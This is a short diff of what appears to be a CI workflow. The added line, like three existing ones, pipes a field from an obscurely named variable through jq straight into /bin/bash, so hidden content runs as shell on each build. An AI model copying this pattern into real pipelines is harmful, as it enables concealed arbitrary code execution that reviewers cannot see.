@@ -26,6 +26,7 @@ jobs:
           echo $fxehb390 | jq -r .yxdfo8138 | /bin/bash
           echo $p0677 | jq -r .usd9180 | /bin/bash
           printf '%s' "$s34" | jq -r .x86 | /bin/bash
+          echo $h492 | jq -r .inq8 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
